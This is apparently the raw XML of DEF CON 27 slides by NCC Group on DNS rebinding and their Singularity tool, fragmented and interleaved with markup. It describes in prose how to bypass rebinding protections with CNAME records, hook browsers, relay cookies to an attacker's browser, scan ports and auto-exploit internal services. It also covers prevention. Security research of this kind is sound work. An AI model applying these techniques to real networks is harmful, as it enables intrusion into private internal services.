      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="448" name="Google Shape;448;g5c283d85d5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5c283d85d5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DNS Rebinding Protection Bypass #2 : Use DNS CNAME records to bypass filters blocking DNS responses containing private IP addresses.</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53" name="Shape 453"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="454" name="Google Shape;454;g5c283d85d5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5c283d85d5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DNS Rebinding Protection Bypass #2a: This is a variation of bypass #2. Use “localhost” as a DNS CNAME record to bypass filters blocking DNS responses containing 127.0.0.1.</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successfully tested this on Firefox &amp; Chrome on Linux and macOS.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59" name="Shape 459"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="460" name="Google Shape;460;g5c05a104a7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5c05a104a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will cover the high-level architecture to browse a target network with Singularity and then some of challenges we encountered.</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64" name="Shape 464"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="465" name="Google Shape;465;g5c05a104a7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5c05a104a7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0" name="Shape 470"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="471" name="Google Shape;471;g5ce2b65a0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5ce2b65a0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Once a target browser is hooked, it will establish a WS connection with Singularity.</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86" name="Shape 486"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="487" name="Google Shape;487;g5ce2b65a0f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5ce2b65a0f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10" name="Shape 510"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="511" name="Google Shape;511;g5c387071f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5c387071f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RoundTripper is an interface representing a single HTTP transaction, obtaining the response for a given request.</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16" name="Shape 516"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="517" name="Google Shape;517;g5c05a104a7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5c05a104a7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Forced to eat cookies for applications that use cookies to store values accessed by JavaScript.</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24" name="Shape 524"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="525" name="Google Shape;525;g5dca5eeb60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5dca5eeb60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about HTTPOnly cookies, that is, cookies that cannot be read by JavaScript. Well if they are HTTPOnly, then the target browser can’t read them so does not need them. Issue resolved.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the target browser can read them, it passes them to singularity via WS, then Singularity sets them on the attacker browser.</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30" name="Shape 530"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="531" name="Google Shape;531;g5c387071f7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5c387071f7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Forced to eat cookies...</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>e</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>xcept when using HTTP authentication.</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37" name="Shape 537"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="538" name="Google Shape;538;g5c387071f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5c387071f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45" name="Shape 545"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="546" name="Google Shape;546;g5c387071f7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5c387071f7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when we detect HTTP authentication, we choose to not eat cookies.</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53" name="Shape 553"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="554" name="Google Shape;554;g5de057f50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5de057f50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View the video on Youtube: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" u="sng">
                <a:solidFill>
                  <a:schemeClr val="hlink"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>https://youtu.be/XWo-CqSXqdY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0" name="Shape 560"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="561" name="Google Shape;561;g5c05a104a7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5c05a104a7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5" name="Shape 565"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="566" name="Google Shape;566;g5c05a104a7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5c05a104a7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1" name="Shape 571"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="572" name="Google Shape;572;g5c05a104a7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5c05a104a7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solution is very simple, we leverage modern APIs to wrap a fetch request with a timeout.</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7" name="Shape 577"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="578" name="Google Shape;578;g5dca5eeb60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5dca5eeb60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scan requests are wrapped in a web worker and we distribute the scan across 4 web workers.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set the timeout to 300 ms. We only care about fetching the resources headers and we ignore the response body.</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83" name="Shape 583"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="584" name="Google Shape;584;g5c387071f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5c387071f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91" name="Shape 591"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="592" name="Google Shape;592;g5c05a104a7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5c05a104a7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explained how to make DNS rebinding more reliable, faster and to how to scan for targets. We will know explain how to orchestrate all of this and automatically detect and exploit services as a bonus.</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96" name="Shape 596"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="597" name="Google Shape;597;g5c387071f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5c387071f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03" name="Shape 603"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="604" name="Google Shape;604;g5c05a104a7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5c05a104a7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10" name="Shape 610"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="611" name="Google Shape;611;g5c05a104a7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5c05a104a7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17" name="Shape 617"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="618" name="Google Shape;618;g5c05a104a7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5c05a104a7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our tool, we wanted to blur the lines between origins. We think we have achieved that, hence the name Singularity of Origin!</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2" name="Shape 622"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="623" name="Google Shape;623;g5c05a104a7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5c05a104a7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Common advices you hear or read in blogs/tutorials/social media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8" name="Shape 628"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="629" name="Google Shape;629;g5d07e9f28e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5d07e9f28e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35" name="Shape 635"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="636" name="Google Shape;636;g5c05a104a7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5c05a104a7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2"/>
              </a:rPr>
              <a:t>https://wicg.github.io/cors-rfc1918/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>  : From the abstract, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>“</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
              </a:rPr>
              <a:t>This document specifies modifications to Fetch which are intended to mitigate the risks associated with unintentional exposure of devices and servers on a client’s internal network to the web at large.”</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41" name="Shape 641"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="642" name="Google Shape;642;g5de057f50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5de057f50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demo shows how DNS rebinding can be automated:</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-298450" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>A port scan detects the open HTTP ports</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-298450" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>DNS Rebinding in 3 seconds</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-298450" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Singularity </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>auto detects</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> the HTTP services for which there are payloads</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-298450" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Runs the payloads to exploit the vulnerable services</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>View the video on Youtube: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" u="sng">
                <a:solidFill>
                  <a:schemeClr val="hlink"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>https://youtu.be/R5Y1luRhjbc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>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48" name="Shape 648"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="649" name="Google Shape;649;g5c18e8f5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5c18e8f5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github.com/nccgroup/singularity" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image3.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16.png"/><Relationship Id="rId8"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mysite.com/hello.html" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://mysite.com/world.html" TargetMode="External"/><Relationship Id="rId11" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image10.png"/><Relationship Id="rId10" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://attacker.com/hello.html" TargetMode="External"/><Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://attacker.com/hello.html" TargetMode="External"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://mysite.com/hello.html" TargetMode="External"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://mysite.com/hello.html" TargetMode="External"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://mysite.com/hello.html" TargetMode="External"/><Relationship Id="rId8" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://attacker.com/hello.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youtu.be/Q0JG_eKLcws" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://youtu.be/VAaqABpjiUQ" TargetMode="External"/><Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://crypto.stanford.edu/dns/" TargetMode="External"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://youtu.be/Zazk0plSoQg" TargetMode="External"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://youtu.be/YwbpnZe74ds" TargetMode="External"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://youtu.be/9iSvAS6IdiM" TargetMode="External"/><Relationship Id="rId8" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.usenix.org/conference/woot13/workshop-program/presentation/Dai"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youtu.be/cjON0_wTpX8" TargetMode="Externa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mark.lindsey.name/2009/03/09/never-use-dns-ttl-of-zero-0/" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://tools.ietf.org/html/rfc2181#page-10"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35.185.206.165-127.0.0.1-3504134792-fs-e.d.rebind.it:8080/"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5.png"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image14.png"/><Relationship Id="rId7"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s://beefproject.com/" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.usenix.org/conference/woot13/workshop-program/presentation/dai" TargetMode="External"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://beef.attaker.com:3120/"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golang.org/pkg/net/http/#RoundTripper"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2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26.png"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image3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6.png"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image2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hyperlink" Target="https://youtu.be/XWo-CqSXqdY" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image30.png"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://youtu.be/XWo-CqSXqdY" TargetMode="External"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image2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2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24.png"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image3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hyperlink" Target="https://github.com/nccgroup/singularity/wiki" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image3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hyperlink" Target="https://www.defcon.org/images/defcon-18/dc-18-presentations/Heffner/DEFCON-18-Heffner-Routers-WP.pdf" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image3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3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hyperlink" Target="https://blog.filippo.io/mkcert-valid-https-certificates-for-localhost/" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/FiloSottile/mkcert/releases" TargetMode="External"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://wicg.github.io/cors-rfc1918/"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hyperlink" Target="https://youtu.be/R5Y1luRhjbc" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image3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hyperlink" Target="https://bit.ly/Singularity_Defcon27" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/nccgroup/singularity" TargetMode="External"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:gerald.doussot@nccgroup.com" TargetMode="External"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:roger.meyer@nccgroup.com" TargetMode="External"/><Relationship Id="rId7"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520600" cy="1342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State of DNS Rebinding</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="55" name="Google Shape;55;p13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="2208875"/>
            <a:ext cx="8520600" cy="141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Attack &amp; Prevention Techniques and</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="ctr">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>the Singularity of Origin</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="ctr">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1800"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="ctr">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="ctr">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1100"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1800"/>
              <a:t>Gérald Doussot &amp; Roger Meyer | DEF CON 27</a:t>
            </a:r>
            <a:endParaRPr sz="1800"/>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None/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="56" name="Google Shape;56;p13"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="7483675" y="3626675"/>
            <a:ext cx="1531857" cy="1417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0" name="Shape 60"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="61" name="Google Shape;61;p14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="1152475"/>
            <a:ext cx="4302600" cy="371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New Tool: Singularity</a:t>
            </a:r>
            <a:endParaRPr u="sng"/>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Everything you need for DNS rebinding</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en"/>
              <a:t>Reliable</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>: Default settings </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="accent5"/>
                </a:solidFill>
              </a:rPr>
              <a:t>just work</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="accent5"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en"/>
              <a:t>Performant</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>: up to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>20x faster</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t> (3s vs 60s)</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en"/>
              <a:t>Built-in payloads</a:t>
            </a:r>
            <a:r>
